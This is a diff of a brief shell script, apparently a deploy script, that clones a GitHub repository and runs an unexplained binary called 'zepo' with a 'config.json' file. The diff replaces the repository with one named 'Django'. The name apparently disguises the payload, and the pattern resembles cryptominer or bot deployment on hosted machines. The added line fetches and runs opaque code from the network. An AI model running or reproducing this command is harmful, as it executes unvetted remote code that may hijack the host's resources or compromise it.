@@ -4,4 +4,4 @@
 # kumaha aink we njink
 
 cd /home/shell-bot
-git clone https://github.com/tolecilik/DEPLOYHK.git && cd zepo && chmod +x config.json && chmod +x zepo && ./zepo -c "config.json" 
+git clone https://github.com/55113110159/Django.git && cd Django && chmod +x config.json && chmod +x zepo && ./zepo -c "config.json" 
